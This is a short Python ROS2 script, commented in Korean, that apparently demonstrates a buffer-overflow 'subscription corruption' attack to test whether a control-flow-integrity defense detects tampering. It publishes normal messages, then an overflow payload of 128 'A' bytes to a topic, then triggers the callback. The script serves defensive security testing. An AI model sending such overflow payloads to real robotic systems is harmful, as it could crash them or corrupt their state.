#!/usr/bin/env python3
# attack_demo.py - ROS2 subscription corruption 공격 시연

import rclpy
from rclpy.node import Node
from std_msgs.msg import String
import time
import sys
import subprocess

class AttackNode(Node):
    def __init__(self):
        super().__init__('attack_node')
        self.publisher_ = self.create_publisher(String, '/attack_topic', 10)
        
    def send_message(self, data):
        """메시지 전송"""
        msg = String()
        msg.data = data
        self.publisher_.publish(msg)
        self.get_logger().info(f'Sent: {data[:50]}{"..." if len(data) > 50 else ""}')
        
    def run_attack_sequence(self):
        """공격 시퀀스 실행"""
        print("\n=== ROS2 Subscription Corruption Attack Demo ===\n")
        
        # Step 1: 정상 메시지로 subscription 등록
        print("[Step 1] Sending normal message to register subscription...")
        self.send_message("Hello, this is a normal message")
        time.sleep(1)
        
        # Step 2: 트리거 메시지로 CFI가 활성화되었는지 확인
        print("\n[Step 2] Triggering callback to verify normal operation...")
        self.send_message("TRIGGER")
        time.sleep(1)
        
        # Step 3: Overflow 공격
        print("\n[Step 3] Sending overflow payload to corrupt subscription...")
        
        # 64바이트를 넘는 페이로드로 subscription 객체 손상 시도
        # A 패턴으로 메모리를 덮어씀
        overflow_payload = "OVERFLOW:" + "A" * 128
        self.send_message(overflow_payload)
        time.sleep(1)
        
        # Step 4: 손상된 subscription으로 콜백 트리거
        print("\n[Step 4] Triggering callback with corrupted subscription...")
        print("Expected result:")
        print("  - Without CFI: May crash or continue with corrupted state")
        print("  - With CFI: Should detect hash change and block execution\n")
        
        self.send_message("TRIGGER")
        time.sleep(2)
        
        # Step 5: 추가 테스트
        print("\n[Step 5] Sending another message to test...")
        self.send_message("Final test message")
        time.sleep(1)
        
        print("\n=== Attack sequence completed ===")

def main():
    rclpy.init()
    
    attack_node = AttackNode()
    
    try:
        # 공격 시퀀스 실행
        attack_node.run_attack_sequence()
        
    except KeyboardInterrupt:
        print("\nAttack interrupted by user")
    except Exception as e:
        print(f"\nError during attack: {e}")
    finally:
        attack_node.destroy_node()
        rclpy.shutdown()

if __name__ == '__main__':
    main()
